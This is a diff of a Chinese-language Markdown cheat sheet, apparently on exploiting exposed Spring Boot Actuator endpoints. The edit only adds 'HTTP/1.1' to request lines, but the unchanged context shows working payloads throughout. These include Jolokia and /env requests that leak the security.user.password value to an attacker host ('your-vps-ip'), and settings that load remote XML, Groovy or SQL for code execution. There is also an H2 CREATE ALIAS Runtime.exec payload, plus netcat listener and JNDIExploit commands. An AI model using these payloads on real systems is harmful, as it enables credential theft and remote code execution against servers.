@@ -221,7 +221,7 @@ GET 请求目标网站的 `/env` 或 `/actuator/env` 接口，搜索 `******` �
 spring 1.x
 
 ```http
-POST /jolokia
+POST /jolokia HTTP/1.1
 Content-Type: application/json
 
 {"mbean": "org.springframework.boot:name=SpringApplication,type=Admin","operation": "getProperty", "type": "EXEC", "arguments": ["security.user.password"]}
@@ -230,7 +230,7 @@ Content-Type: application/json
 spring 2.x
 
 ```http
-POST /actuator/jolokia
+POST /actuator/jolokia HTTP/1.1
 Content-Type: application/json
 
 {"mbean": "org.springframework.boot:name=SpringApplication,type=Admin","operation": "getProperty", "type": "EXEC", "arguments": ["security.user.password"]}
@@ -243,7 +243,7 @@ Content-Type: application/json
 spring 1.x
 
 ```http
-POST /jolokia
+POST /jolokia HTTP/1.1
 Content-Type: application/json
 
 {"mbean": "org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager","operation": "getProperty", "type": "EXEC", "arguments": ["security.user.password"]}
@@ -252,7 +252,7 @@ Content-Type: application/json
 spring 2.x
 
 ```http
-POST /actuator/jolokia
+POST /actuator/jolokia HTTP/1.1
 Content-Type: application/json
 
 {"mbean": "org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager","operation": "getProperty", "type": "EXEC", "arguments": ["security.user.password"]}
@@ -295,7 +295,7 @@ nc -lvk 80
 spring 1.x
 
 ```http
-POST /env
+POST /env HTTP/1.1
 Content-Type: application/x-www-form-urlencoded
 
 eureka.client.serviceUrl.defaultZone=http://value:${security.user.password}@your-vps-ip
@@ -304,7 +304,7 @@ eureka.client.serviceUrl.defaultZone=http://value:${security.user.password}@your
 spring 2.x
 
 ```http
-POST /actuator/env
+POST /actuator/env HTTP/1.1
 Content-Type: application/json
 
 {"name":"eureka.client.serviceUrl.defaultZone","value":"http://value:${security.user.password}@your-vps-ip"}
@@ -315,7 +315,7 @@ Content-Type: application/json
 spring 1.x
 
 ```http
-POST /refresh
+POST /refresh HTTP/1.1
 Content-Type: application/x-www-form-urlencoded
 
 ```
@@ -323,7 +323,7 @@ Content-Type: application/x-www-form-urlencoded
 spring 2.x
 
 ```http
-POST /actuator/refresh
+POST /actuator/refresh HTTP/1.1
 Content-Type: application/json
 
 ```
@@ -368,7 +368,7 @@ nc -lvk 80
 spring 1.x
 
 ```http
-POST /env
+POST /env HTTP/1.1
 Content-Type: application/x-www-form-urlencoded
 
 spring.cloud.bootstrap.location=http://your-vps-ip/?=${security.user.password}
@@ -377,7 +377,7 @@ spring.cloud.bootstrap.location=http://your-vps-ip/?=${security.user.password}
 spring 2.x
 
 ```http
-POST /actuator/env
+POST /actuator/env HTTP/1.1
 Content-Type: application/json
 
 {"name":"spring.cloud.bootstrap.location","value":"http://your-vps-ip/?=${security.user.password}"}
@@ -388,7 +388,7 @@ Content-Type: application/json
 spring 1.x
 
 ```http
-POST /env
+POST /env HTTP/1.1
 Content-Type: application/x-www-form-urlencoded
 
 eureka.client.serviceUrl.defaultZone=http://your-vps-ip/${security.user.password}
@@ -397,7 +397,7 @@ eureka.client.serviceUrl.defaultZone=http://your-vps-ip/${security.user.password
 spring 2.x
 
 ```http
-POST /actuator/env
+POST /actuator/env HTTP/1.1
 Content-Type: application/json
 
 {"name":"eureka.client.serviceUrl.defaultZone","value":"http://your-vps-ip/${security.user.password}"}
@@ -408,7 +408,7 @@ Content-Type: application/json
 spring 1.x
 
 ```http
-POST /refresh
+POST /refresh HTTP/1.1
 Content-Type: application/x-www-form-urlencoded
 
 ```
@@ -416,7 +416,7 @@ Content-Type: application/x-www-form-urlencoded
 spring 2.x
 
 ```http
-POST /actuator/refresh
+POST /actuator/refresh HTTP/1.1
 Content-Type: application/json
 
 ```
@@ -559,7 +559,7 @@ python3 -m http.server 80
 spring 1.x
 
 ```http
-POST /env
+POST /env HTTP/1.1
 Content-Type: application/x-www-form-urlencoded
 
 spring.cloud.bootstrap.location=http://your-vps-ip/example.yml
@@ -568,7 +568,7 @@ spring.cloud.bootstrap.location=http://your-vps-ip/example.yml
 spring 2.x
 
 ```http
-POST /actuator/env
+POST /actuator/env HTTP/1.1
 Content-Type: application/json
 
 {"name":"spring.cloud.bootstrap.location","value":"http://your-vps-ip/example.yml"}
@@ -579,7 +579,7 @@ Content-Type: application/json
 spring 1.x
 
 ```http
-POST /refresh
+POST /refresh HTTP/1.1
 Content-Type: application/x-www-form-urlencoded
 
 ```
@@ -587,7 +587,7 @@ Content-Type: application/x-www-form-urlencoded
 spring 2.x
 
 ```http
-POST /actuator/refresh
+POST /actuator/refresh HTTP/1.1
 Content-Type: application/json
 
 ```
@@ -645,7 +645,7 @@ nc -lvp 443
 spring 1.x
 
 ```http
-POST /env
+POST /env HTTP/1.1
 Content-Type: application/x-www-form-urlencoded
 
 eureka.client.serviceUrl.defaultZone=http://your-vps-ip/example
@@ -654,7 +654,7 @@ eureka.client.serviceUrl.defaultZone=http://your-vps-ip/example
 spring 2.x
 
 ```http
-POST /actuator/env
+POST /actuator/env HTTP/1.1
 Content-Type: application/json
 
 {"name":"eureka.client.serviceUrl.defaultZone","value":"http://your-vps-ip/example"}
@@ -665,7 +665,7 @@ Content-Type: application/json
 spring 1.x
 
 ```http
-POST /refresh
+POST /refresh HTTP/1.1
 Content-Type: application/x-www-form-urlencoded
 
 ```
@@ -673,7 +673,7 @@ Content-Type: application/x-www-form-urlencoded
 spring 2.x
 
 ```http
-POST /actuator/refresh
+POST /actuator/refresh HTTP/1.1
 Content-Type: application/json
 
 ```
@@ -884,7 +884,7 @@ http://127.0.0.1:9094/env
 spring 1.x（无回显执行命令）
 
 ```http
-POST /env
+POST /env HTTP/1.1
 Content-Type: application/x-www-form-urlencoded
 
 spring.datasource.hikari.connection-test-query=CREATE ALIAS T5 AS CONCAT('void ex(String m1,String m2,String m3)throws Exception{Runti','me.getRun','time().exe','c(new String[]{m1,m2,m3});}');CALL T5('cmd','/c','calc');
@@ -893,7 +893,7 @@ spring.datasource.hikari.connection-test-query=CREATE ALIAS T5 AS CONCAT('void e
 spring 2.x（无回显执行命令）
 
 ```http
-POST /actuator/env
+POST /actuator/env HTTP/1.1
 Content-Type: application/json
 
 {"name":"spring.datasource.hikari.connection-test-query","value":"CREATE ALIAS T5 AS CONCAT('void ex(String m1,String m2,String m3)throws Exception{Runti','me.getRun','time().exe','c(new String[]{m1,m2,m3});}');CALL T5('cmd','/c','calc');"}
@@ -904,7 +904,7 @@ Content-Type: application/json
 spring 1.x
 
 ```http
-POST /restart
+POST /restart HTTP/1.1
 Content-Type: application/x-www-form-urlencoded
 
 ```
@@ -912,7 +912,7 @@ Content-Type: application/x-www-form-urlencoded
 spring 2.x
 
 ```http
-POST /actuator/restart
+POST /actuator/restart HTTP/1.1
 Content-Type: application/json
 
 ```
@@ -1069,7 +1069,7 @@ jdbc:mysql://your-vps-ip:3306/mysql?characterEncoding=utf8&useSSL=false&queryInt
 spring 1.x
 
 ```http
-POST /env
+POST /env HTTP/1.1
 Content-Type: application/x-www-form-urlencoded
 
 spring.datasource.url=对应属性值
@@ -1078,7 +1078,7 @@ spring.datasource.url=对应属性值
 spring 2.x
 
 ```http
-POST /actuator/env
+POST /actuator/env HTTP/1.1
 Content-Type: application/json
 
 {"name":"spring.datasource.url","value":"对应属性值"}
@@ -1089,7 +1089,7 @@ Content-Type: application/json
 spring 1.x
 
 ```http
-POST /refresh
+POST /refresh HTTP/1.1
 Content-Type: application/x-www-form-urlencoded
 
 ```
@@ -1097,7 +1097,7 @@ Content-Type: application/x-www-form-urlencoded
 spring 2.x
 
 ```http
-POST /actuator/refresh
+POST /actuator/refresh HTTP/1.1
 Content-Type: application/json
 
 ```
@@ -1185,7 +1185,7 @@ java -jar JNDIExploit-1.0-SNAPSHOT.jar -i your-vps-ip
 spring 1.x
 
 ```http
-POST /env
+POST /env HTTP/1.1
 Content-Type: application/x-www-form-urlencoded
 
 logging.config=http://your-vps-ip/example.xml
@@ -1194,7 +1194,7 @@ logging.config=http://your-vps-ip/example.xml
 spring 2.x
 
 ```http
-POST /actuator/env
+POST /actuator/env HTTP/1.1
 Content-Type: application/json
 
 {"name":"logging.config","value":"http://your-vps-ip/example.xml"}
@@ -1205,7 +1205,7 @@ Content-Type: application/json
 spring 1.x
 
 ```http
-POST /restart
+POST /restart HTTP/1.1
 Content-Type: application/x-www-form-urlencoded
 
 ```
@@ -1213,7 +1213,7 @@ Content-Type: application/x-www-form-urlencoded
 spring 2.x
 
 ```http
-POST /actuator/restart
+POST /actuator/restart HTTP/1.1
 Content-Type: application/json
 
 ```
@@ -1277,7 +1277,7 @@ Runtime.getRuntime().exec("open -a Calculator")
 spring 1.x
 
 ```http
-POST /env
+POST /env HTTP/1.1
 Content-Type: application/x-www-form-urlencoded
 
 logging.config=http://your-vps-ip/example.groovy
@@ -1286,7 +1286,7 @@ logging.config=http://your-vps-ip/example.groovy
 spring 2.x
 
 ```http
-POST /actuator/env
+POST /actuator/env HTTP/1.1
 Content-Type: application/json
 
 {"name":"logging.config","value":"http://your-vps-ip/example.groovy"}
@@ -1297,7 +1297,7 @@ Content-Type: application/json
 spring 1.x
 
 ```http
-POST /restart
+POST /restart HTTP/1.1
 Content-Type: application/x-www-form-urlencoded
 
 ```
@@ -1305,7 +1305,7 @@ Content-Type: application/x-www-form-urlencoded
 spring 2.x
 
 ```http
-POST /actuator/restart
+POST /actuator/restart HTTP/1.1
 Content-Type: application/json
 
 ```
@@ -1362,7 +1362,7 @@ Runtime.getRuntime().exec("open -a Calculator")
 spring 1.x
 
 ```http
-POST /env
+POST /env HTTP/1.1
 Content-Type: application/x-www-form-urlencoded
 
 spring.main.sources=http://your-vps-ip/example.groovy
@@ -1371,7 +1371,7 @@ spring.main.sources=http://your-vps-ip/example.groovy
 spring 2.x
 
 ```http
-POST /actuator/env
+POST /actuator/env HTTP/1.1
 Content-Type: application/json
 
 {"name":"spring.main.sources","value":"http://your-vps-ip/example.groovy"}
@@ -1382,7 +1382,7 @@ Content-Type: application/json
 spring 1.x
 
 ```http
-POST /restart
+POST /restart HTTP/1.1
 Content-Type: application/x-www-form-urlencoded
 
 ```
@@ -1390,7 +1390,7 @@ Content-Type: application/x-www-form-urlencoded
 spring 2.x
 
 ```http
-POST /actuator/restart
+POST /actuator/restart HTTP/1.1
 Content-Type: application/json
 
 ```
@@ -1448,7 +1448,7 @@ CREATE ALIAS T5 AS CONCAT('void ex(String m1,String m2,String m3)throws Exceptio
 spring 1.x
 
 ```http
-POST /env
+POST /env HTTP/1.1
 Content-Type: application/x-www-form-urlencoded
 
 spring.datasource.data=http://your-vps-ip/example.sql
@@ -1457,7 +1457,7 @@ spring.datasource.data=http://your-vps-ip/example.sql
 spring 2.x
 
 ```http
-POST /actuator/env
+POST /actuator/env HTTP/1.1
 Content-Type: application/json
 
 {"name":"spring.datasource.data","value":"http://your-vps-ip/example.sql"}
@@ -1468,7 +1468,7 @@ Content-Type: application/json
 spring 1.x
 
 ```http
-POST /restart
+POST /restart HTTP/1.1
 Content-Type: application/x-www-form-urlencoded
 
 ```
@@ -1476,7 +1476,7 @@ Content-Type: application/x-www-form-urlencoded
 spring 2.x
 
 ```http
-POST /actuator/restart
+POST /actuator/restart HTTP/1.1
 Content-Type: application/json
 
 ```
